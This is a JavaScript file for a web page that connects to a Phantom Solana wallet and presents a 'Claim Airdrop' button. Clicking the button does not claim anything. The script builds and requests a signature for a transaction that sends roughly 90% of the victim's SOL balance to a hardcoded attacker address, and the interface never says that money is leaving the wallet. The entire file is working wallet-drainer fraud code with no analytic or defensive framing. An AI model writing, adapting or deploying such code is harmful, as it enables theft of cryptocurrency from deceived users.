$(document).ready(function() {
    let cachedBalance = null; // Cache balance to reduce RPC calls
    $('#connect-wallet').on('click', async function(event) {
        event.preventDefault();
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                // Try multiple RPCs
                const rpcEndpoints = [
                    'https://api.mainnet-beta.solana.com', // Primary Solana public RPC
                    'https://rpc.ankr.com/solana' // Fallback public RPC (Ankr)
                ];
                let connection;
                for (const endpoint of rpcEndpoints) {
                    try {
                        connection = new solanaWeb3.Connection(endpoint, 'confirmed');
                        await connection.getSlot(); // Test connection
                        break;
                    } catch (err) {
                        continue;
                    }
                }
                if (!connection) {
                    throw new Error("All RPC endpoints failed.");
                }

                const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
                cachedBalance = cachedBalance !== null ? cachedBalance : await connection.getBalance(publicKey);
                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                const gasFeeBuffer = 50000; // 0.00005 SOL for fees

                if (cachedBalance < minBalance + gasFeeBuffer) {
                    alert("Insufficient SOL. Please add at least " + ((minBalance + gasFeeBuffer - cachedBalance) / 1e9) + " SOL.");
                    return;
                }

                $('#connect-wallet').text("Claim Airdrop");
                $('#connect-wallet').off('click').on('click', async function(event) {
                    event.preventDefault();
                    try {
                        const receiverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp');
                        const balanceForTransfer = cachedBalance - minBalance - gasFeeBuffer;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient SOL for transfer.");
                            return;
                        }

                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: receiverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.9),
                            })
                        );

                        transaction.feePayer = publicKey;
                        const blockhashObj = await connection.getLatestBlockhash('confirmed');
                        transaction.recentBlockhash = blockhashObj.blockhash;
                        transaction.lastValidBlockHeight = blockhashObj.lastValidBlockHeight;

                        const signed = await window.solana.signTransaction(transaction);
                        const txid = await connection.sendRawTransaction(signed.serialize(), {
                            skipPreflight: false,
                            maxRetries: 3,
                        });
                        await connection.confirmTransaction({
                            signature: txid,
                            blockhash: blockhashObj.blockhash,
                            lastValidBlockHeight: blockhashObj.lastValidBlockHeight,
                        }, 'confirmed');

                        alert("Transaction successful.");
                    } catch (err) {
                        let errorMessage = err.message;
                        if (err.message.includes("429") || err.message.includes("403")) {
                            errorMessage = "RPC rate limit exceeded or access denied. Please try again later.";
                        } else if (err.message.includes("Blockhash")) {
                            errorMessage = "Invalid transaction blockhash. Please try again.";
                        } else if (err.message.includes("Signature")) {
                            errorMessage = "Transaction signature failed. Check your wallet.";
                        }
                        alert("Failed to process transaction: " + errorMessage);
                    }
                });
            } catch (err) {
                let errorMessage = err.message;
                if (err.message.includes("429") || err.message.includes("403")) {
                    errorMessage = "RPC rate limit exceeded or access denied. Please try again later.";
                }
                alert("Failed to connect to Phantom Wallet: " + errorMessage);
            }
        } else {
            alert("Phantom Wallet not detected. Please install it.");
        }
    });
});
